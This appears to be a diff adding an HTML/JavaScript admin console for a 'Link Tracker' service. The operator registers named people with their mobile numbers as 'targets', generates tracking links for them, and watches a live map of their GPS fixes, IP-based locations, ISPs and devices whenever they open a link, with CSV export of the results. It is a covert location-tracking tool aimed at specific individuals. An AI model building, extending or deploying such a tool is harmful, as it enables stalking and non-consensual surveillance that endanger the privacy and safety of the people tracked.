@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Link Tracker — Admin Console</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+:root{
+  --bg:#0b0e14; --panel:#131722; --panel2:#1a2030; --line:#232b3d;
+  --txt:#e6eaf2; --dim:#8b94ab; --acc:#4c9aff; --green:#3ddc84; --red:#ff6b6b; --gold:#ffd76a;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh}
+header{position:sticky;top:0;z-index:100;display:flex;justify-content:space-between;align-items:center;padding:14px 22px;
+  background:rgba(19,23,34,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.brand{font-size:17px;font-weight:800}
+.brand .sub{font-size:12px;font-weight:500;color:var(--dim);margin-left:8px}
+.hchips{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.chip{font-size:11.5px;color:var(--dim);background:var(--panel2);border:1px solid var(--line);padding:5px 10px;border-radius:20px;display:flex;align-items:center;gap:6px}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 1.4s infinite}
+@keyframes blink{50%{opacity:.25}}
+main{max-width:1280px;margin:0 auto;padding:20px 22px 60px}
+
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:18px}
+.stat{background:linear-gradient(160deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:14px;padding:16px 18px;position:relative;overflow:hidden}
+.stat::after{content:"";position:absolute;right:-30px;top:-30px;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle,rgba(76,154,255,.18),transparent 70%)}
+.stat .k{font-size:11px;letter-spacing:1.4px;text-transform:uppercase;color:var(--dim)}
+.stat .v{font-size:30px;font-weight:800;margin-top:4px;font-variant-numeric:tabular-nums}
+.v.green{color:var(--green)}.v.blue{color:var(--acc)}.v.gold{color:var(--gold)}
+
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px;margin-bottom:18px}
+.card-head{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:14px}
+.card-head h3{font-size:15px;font-weight:700}
+.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+
+input,select{background:#0e1220;border:1px solid var(--line);color:var(--txt);border-radius:10px;padding:9px 12px;font-size:13.5px;outline:none}
+input:focus,select:focus{border-color:var(--acc)}
+input::placeholder{color:#5a6279}
+.btn{background:var(--acc);color:#fff;border:none;border-radius:10px;padding:9px 16px;font-size:13.5px;font-weight:700;cursor:pointer;transition:filter .15s,transform .1s}
+.btn:hover{filter:brightness(1.12)}.btn:active{transform:scale(.97)}
+.btn.green{background:linear-gradient(180deg,#4ade80,#22c55e);color:#06280f}
+.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--dim)}
+.btn.danger{background:#2a1a1a;border:1px solid rgba(255,107,107,.4);color:var(--red)}
+.btn.sm{padding:5px 10px;font-size:12px;border-radius:8px}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.grow{flex:1;min-width:140px}
+
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;color:var(--dim);font-size:11px;letter-spacing:.8px;text-transform:uppercase;padding:8px 10px;border-bottom:1px solid var(--line);background:#151a28;position:sticky;top:0}
+td{padding:9px 10px;border-bottom:1px solid #1c2334;vertical-align:middle}
+tbody tr{transition:background .3s}
+tbody tr:hover{background:rgba(76,154,255,.06)}
+tr.flash{animation:flashbg 2.2s ease-out}
+@keyframes flashbg{0%{background:rgba(61,220,132,.28)}100%{background:transparent}}
+tr.exp-row td{background:#0e1220;font-size:12.5px;color:var(--dim);padding:12px 14px}
+
+.pill{display:inline-block;padding:2px 9px;border-radius:20px;font-size:10.5px;font-weight:700;letter-spacing:.5px}
+.pill.gps{background:rgba(61,220,132,.15);color:var(--green)}
+.pill.ip{background:rgba(76,154,255,.15);color:var(--acc)}
+.pill.denied{background:rgba(255,107,107,.15);color:var(--red)}
+.pill.none{background:rgba(139,148,171,.12);color:var(--dim)}
+
+.place{color:#bcd3ff;font-weight:600;font-size:12.5px}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;color:#9fb4d9}
+#map{height:52vh;border-radius:12px;border:1px solid var(--line);z-index:1}
+.legend{font-size:11.5px;color:var(--dim);margin-top:10px;display:flex;gap:14px;flex-wrap:wrap}
+.legend i{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:5px}
+.grid2{display:grid;grid-template-columns:1fr 1.4fr;gap:18px}
+@media(max-width:980px){.grid2{grid-template-columns:1fr}}
+.searchbar{position:relative}
+.searchbar input{width:100%;padding-left:32px}
+.searchbar::before{content:"🔍";position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:12px;opacity:.7}
+.mapslink{color:var(--acc);text-decoration:none;font-size:12px}
+.mapslink:hover{text-decoration:underline}
+.tblwrap{max-height:420px;overflow:auto}
+.tblwrap::-webkit-scrollbar{width:8px}.tblwrap::-webkit-scrollbar-thumb{background:#262f45;border-radius:8px}
+.empty{text-align:center;color:var(--dim);padding:26px 10px;font-size:13px}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">📍 Link Tracker <span class="sub">admin console</span></div>
+  <div class="hchips">
+    <span class="chip"><span class="dot"></span> LIVE</span>
+    <span class="chip" id="clock">--:--:--</span>
+    <button class="btn ghost sm" onclick="refreshAll()">↻ Refresh</button>
+    <button class="btn ghost sm" onclick="exportCSV()">⤓ CSV</button>
+  </div>
+</header>
+
+<main>
+  <section class="stats">
+    <div class="stat"><div class="k">Targets</div><div class="v blue" id="stTargets">0</div></div>
+    <div class="stat"><div class="k">Total hits</div><div class="v" id="stHits">0</div></div>
+    <div class="stat"><div class="k">GPS fixes</div><div class="v green" id="stGps">0</div></div>
+    <div class="stat"><div class="k">Online (5m)</div><div class="v gold" id="stOnline">0</div></div>
+  </section>
+
+  <section class="card">
+    <div class="card-head"><h3>＋ Create tracking link</h3><span id="formMsg" style="color:var(--red);font-size:12.5px"></span></div>
+    <div class="row">
+      <input id="inpName" class="grow" placeholder="Name (e.g. John Doe)">
+      <input id="inpMobile" class="grow" placeholder="Mobile (e.g. +1 555 0100)">
+      <button class="btn green" onclick="createTarget()">Generate link</button>
+    </div>
+    <div class="row" id="linkRow" style="display:none;margin-top:12px">
+      <input readonly id="genLink" class="grow" style="color:var(--green)">
+      <button class="btn sm" onclick="copyText('genLink',this)">Copy</button>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-head">
+      <h3>🗺 Live map</h3>
+      <div class="controls">
+        <select id="filter" onchange="loadHits()"><option value="">All targets</option></select>
+        <label class="chip"><input type="checkbox" id="onlyGps" onchange="loadHits()"> GPS only</label>
+      </div>
+    </div>
+    <div id="map"></div>
+    <div class="legend" id="legend"></div>
+  </section>
+
+  <div class="grid2">
+    <section class="card">
+      <div class="card-head"><h3>🎯 Targets</h3><div class="searchbar grow"><input id="searchTargets" placeholder="Search name / mobile / place…" oninput="renderTargets()"></div></div>
+      <div class="tblwrap">
+        <table>
+          <thead><tr><th>Name</th><th>Last location</th><th>Hits</th><th>GPS</th><th>Last seen</th><th></th></tr></thead>
+          <tbody id="targetRows"></tbody>
+        </table>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-head"><h3>📡 Hit feed</h3><div class="searchbar grow"><input id="searchHits" placeholder="Search name / place / IP…" oninput="renderHits()"></div></div>
+      <div class="tblwrap">
+        <table>
+          <thead><tr><th>Time</th><th>Target</th><th>Type</th><th>Location</th><th>Coords</th><th>IP</th></tr></thead>
+          <tbody id="hitRows"></tbody>
+        </table>
+      </div>
+    </section>
+  </div>
+</main>
+
+<script>
+const token = new URLSearchParams(location.search).get('token');
+const q = token ? '?token=' + token : '';
+
+const COLORS = ['#4c9aff','#ff6b6b','#3ddc84','#ffd76a','#b083ff','#00c2d1','#ff9d2e','#f472b6'];
+let targets = [], hits = [], known = new Set(), markers = {}, firstFit = true;
+
+const $ = id => document.getElementById(id);
+
+const map = L.map('map').setView([20,0],2);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap'}).addTo(map);
+
+/* ---------- helpers ---------- */
+async function api(path, opts={}){
+  const r = await fetch(path+q,{headers:{'Content-Type':'application/json'},...opts});
+  if(!r.ok) throw new Error((await r.json()).error||'request failed');
+  return r.json();
+}
+const esc = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const timeAgo = iso => { const s=(Date.now()-new Date(iso))/1000;
+  if(s<60) return Math.floor(s)+'s ago'; if(s<3600) return Math.floor(s/60)+'m ago';
+  if(s<86400) return Math.floor(s/3600)+'h ago'; return Math.floor(s/86400)+'d ago'; };
+const shortT = iso => new Date(iso).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+const mapsLink = (lat,lng) => `<a class="mapslink" target="_blank" href="https://www.google.com/maps?q=${lat},${lng}">Google Maps ↗</a>`;
+const typePill = h => h.gps ? '<span class="pill gps">GPS</span>'
+  : h.source==='denied' ? '<span class="pill denied">DENIED</span>'
+  : h.geoip ? '<span class="pill ip">IP</span>' : '<span class="pill none">—</span>';
+const colorOf = id => { const i=targets.findIndex(t=>t.id===id); return COLORS[Math.max(0,i)%COLORS.length]; };
+
+setInterval(()=>{ $('clock').textContent=new Date().toLocaleTimeString(); },1000);
+
+/* ---------- actions ---------- */
+async function createTarget(){
+  const name=$('inpName').value.trim(), mobile=$('inpMobile').value.trim();
+  if(!name||!mobile){ $('formMsg').textContent='Fill in both fields.'; return; }
+  $('formMsg').textContent='';
+  try{
+    const {link}=await api('/api/targets',{method:'POST',body:JSON.stringify({name,mobile})});
+    $('genLink').value=link; $('linkRow').style.display='flex';
+    $('inpName').value=''; $('inpMobile').value='';
+    await refreshAll();
+  }catch(e){ $('formMsg').textContent=e.message; }
+}
+async function copyText(id,btn){
+  const v=$(id).value;
+  try{ await navigator.clipboard.writeText(v);}catch(_){ $(id).select(); document.execCommand('copy'); }
+  const t=btn.textContent; btn.textContent='✓ Copied'; setTimeout(()=>btn.textContent=t,1500);
+}
+async function copyRaw(text,btn){
+  try{ await navigator.clipboard.writeText(text);}catch(_){}
+  const t=btn.textContent; btn.textContent='✓'; setTimeout(()=>btn.textContent=t,1500);
+}
+async function deleteTarget(id){
+  if(!confirm('Delete this target and all its hits?')) return;
+  await api('/api/targets/'+id,{method:'DELETE'});
+  await refreshAll();
+}
+
+/* ---------- rendering ---------- */
+function renderTargets(){
+  const term=$('searchTargets').value.trim().toLowerCase();
+  const rows = targets
+    .filter(t=>!term || [t.name,t.mobile,t.lastPlace||''].join(' ').toLowerCase().includes(term))
+    .map(t=>{
+      const gpsCount=t.hits.filter(h=>h.gps).length;
+      const last=t.hits.length? timeAgo(t.hits[t.hits.length-1].ts):'—';
+      return `<tr>
+        <td><b>${esc(t.name)}</b><div class="mono" style="font-size:11px;color:var(--dim)">${esc(t.mobile)}</div></td>
+        <td class="place" style="max-width:170px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
+            title="${esc(t.lastPlace||'')}">${esc(t.lastPlace||'—')}</td>
+        <td>${t.hits.length}</td>
+        <td>${gpsCount?`<span class="pill gps">${gpsCount} fix${gpsCount>1?'es':''}</span>`:'<span class="pill none">no</span>'}</td>
+        <td style="color:var(--dim);font-size:12px">${last}</td>
+        <td style="white-space:nowrap">
+          <button class="btn sm ghost" onclick="copyRaw('${location.origin}/t/${t.id}',this)">⧉ link</button>
+          <button class="btn sm danger" onclick="deleteTarget('${t.id}')">✕</button>
+        </td></tr>`;
+    }).join('');
+  $('targetRows').innerHTML = rows || `<tr><td colspan="6" class="empty">No targets${term?' match your search':''}.</td></tr>`;
+}
+
+function renderHits(){
+  const term=$('searchHits').value.trim().toLowerCase();
+  const fTarget=$('filter').value, onlyGps=$('onlyGps').checked;
+  const list = hits.filter(h=>{
+    if(fTarget && h.target.id!==fTarget) return false;
+    if(onlyGps && !h.gps) return false;
+    if(term && ![h.target.name,h.target.mobile,h.place,h.ip].join(' ').toLowerCase().includes(term)) return false;
+    return true;
+  });
+  const rows = list.map(h=>{
+    const isNew = !known.has(h.id);
+    const pos = h.gps?[h.gps.lat,h.gps.lng]:(h.geoip?[h.geoip.lat,h.geoip.lon]:null);
+    return `<tr class="${isNew?'flash':''}" onclick="toggleRow(this,'${h.id}')" style="cursor:pointer">
+      <td style="white-space:nowrap">${shortT(h.ts)}<div class="mono" style="font-size:10.5px;color:var(--dim)">${timeAgo(h.ts)}</div></td>
+      <td><b>${esc(h.target.name)}</b><div class="mono" style="font-size:11px;color:var(--dim)">${esc(h.target.mobile)}</div></td>
+      <td>${typePill(h)}</td>
+      <td class="place" style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
+          title="${esc(h.place||'')}">${esc(h.place||'—')}</td>
+      <td class="mono">${pos?pos[0].toFixed(4)+', '+pos[1].toFixed(4):'—'}</td>
+      <td class="mono">${esc(h.ip)}</td>
+    </tr>
+    <tr class="exp-row" id="exp-${h.id}" style="display:none"><td colspan="6">
+      <div class="row"><span>📍 <b>${esc(h.place||'Unknown location')}</b></span>
+        ${pos?`<span>${mapsLink(pos[0],pos[1])}</span>`:''}</div>
+      <div class="row" style="margin-top:6px;gap:16px">
+        <span>Lat <b class="mono">${pos?pos[0]:'—'}</b></span>
+        <span>Lng <b class="mono">${pos?pos[1]:'—'}</b></span>
+        ${h.gps?`<span>Accuracy <b class="mono">${h.gps.accuracy?Math.round(h.gps.accuracy)+' m':'—'}</b></span>`:''}
+        <span>ISP <b class="mono">${h.geoip?esc(h.geoip.isp):'—'}</b></span>
+        <span>IP <b class="mono">${esc(h.ip)}</b></span>
+      </div>
+      <div style="margin-top:6px">UA: <span class="mono">${esc(h.ua)}</span></div>
+      <div class="mono" style="margin-top:4px;color:#5a6279">${new Date(h.ts).toLocaleString()}</div>
+    </td></tr>`;
+  }).join('');
+  $('hitRows').innerHTML = rows || `<tr><td colspan="6" class="empty">No hits recorded yet.</td></tr>`;
+}
+
+function toggleRow(tr,id){
+  const exp=document.getElementById('exp-'+id);
+  if(exp) exp.style.display = exp.style.display==='none'?'table-row':'none';
+}
+
+function renderMap(){
+  Object.values(markers).forEach(m=>map.removeLayer(m));
+  markers={}; firstFit=true;
+  const fTarget=$('filter').value, onlyGps=$('onlyGps').checked;
+  hits.filter(h=>{
+    if(fTarget && h.target.id!==fTarget) return false;
+    if(onlyGps && !h.gps) return false;
+    return true;
+  }).forEach(h=>{
+    const pos=h.gps?[h.gps.lat,h.gps.lng]:(h.geoip?[h.geoip.lat,h.geoip.lon]:null);
+    if(!pos) return;
+    const c=colorOf(h.target.id);
+    const m=L.circleMarker(pos,{radius:h.gps?9:6,color:'#fff',weight:1.5,fillColor:c,fillOpacity:.85})
+      .addTo(map)
+      .bindPopup(`<b>${esc(h.target.name)}</b> <span style="color:#888">(${esc(h.target.mobile)})</span><br>`+
+        `<b>${esc(h.place||'Unknown location')}</b><br>`+
+        `${h.gps?'GPS fix':'IP estimate'} · ${shortT(h.ts)} · ${timeAgo(h.ts)}<br>`+
+        (h.gps&&h.gps.accuracy?`Accuracy: <b>${Math.round(h.gps.accuracy)} m</b><br>`:'')+
+        `${mapsLink(pos[0],pos[1])}`);
+    markers[h.id]=m;
+    if(firstFit){ map.setView(pos,13); firstFit=false; }
+  });
+}
+
+function renderLegend(){
+  $('legend').innerHTML = targets.map((t,i)=>`<span><i style="background:${COLORS[i%COLORS.length]}"></i>${esc(t.name)}</span>`).join('');
+}
+
+/* ---------- data + live loop ---------- */
+async function loadData(){
+  targets = await api('/api/targets');
+  targets.forEach(t=>{
+    const last=[...t.hits].reverse().find(h=>h.place);
+    t.lastPlace = last?last.place:null;
+  });
+  hits = await api('/api/locations');
+}
+
+function renderAll(){
+  const gpsCount=hits.filter(h=>h.gps).length;
+  const online=hits.filter(h=>Date.now()-new Date(h.ts)<5*60*1000).length;
+  animate($('stTargets'),targets.length);
+  animate($('stHits'),hits.length);
+  animate($('stGps'),gpsCount);
+  animate($('stOnline'),online);
+
+  const f=$('filter'), prev=f.value;
+  f.innerHTML='<option value="">All targets</option>'+targets.map(t=>`<option value="${t.id}">${esc(t.name)}</option>`).join('');
+  f.value=prev;
+
+  renderTargets(); renderHits(); renderMap(); renderLegend();
+  hits.forEach(h=>known.add(h.id));   // mark seen → next refresh flashes only NEW hits
+}
+
+function animate(el,val){
+  const cur=parseInt(el.textContent)||0;
+  if(cur===val){ el.textContent=val; return; }
+  const start=performance.now(), dur=400;
+  const step=t=>{
+    const p=Math.min(1,(t-start)/dur);
+    el.textContent=Math.round(cur+(val-cur)*p);
+    if(p<1) requestAnimationFrame(step);
+  };
+  requestAnimationFrame(step);
+}
+
+async function refreshAll(){ try{ await loadData(); renderAll(); }catch(e){ console.error(e); } }
+
+function exportCSV(){
+  const rows=[['time','target','mobile','type','place','lat','lng','accuracy_m','ip','isp','ua']];
+  hits.forEach(h=>{
+    const pos=h.gps?[h.gps.lat,h.gps.lng]:(h.geoip?[h.geoip.lat,h.geoip.lon]:[null,null]);
+    rows.push([new Date(h.ts).toISOString(),h.target.name,h.target.mobile,h.gps?'gps':h.source,
+      h.place||'',pos[0],pos[1],h.gps?Math.round(h.gps.accuracy):'',h.ip,h.geoip?h.geoip.isp:'',h.ua]);
+  });
+  const csv=rows.map(r=>r.map(v=>`"${String(v??'').replace(/"/g,'""')}"`).join(',')).join('\n');
+  const a=document.createElement('a');
+  a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(csv);
+  a.download='hits-'+new Date().toISOString().slice(0,10)+'.csv';
+  a.click();
+}
+
+/* start */
+(async function init(){
+  try{ await loadData(); hits.forEach(h=>known.add(h.id)); }catch(e){}
+  renderAll();
+  setInterval(refreshAll,3000);
+})();
+</script>
+</body>
+</html>
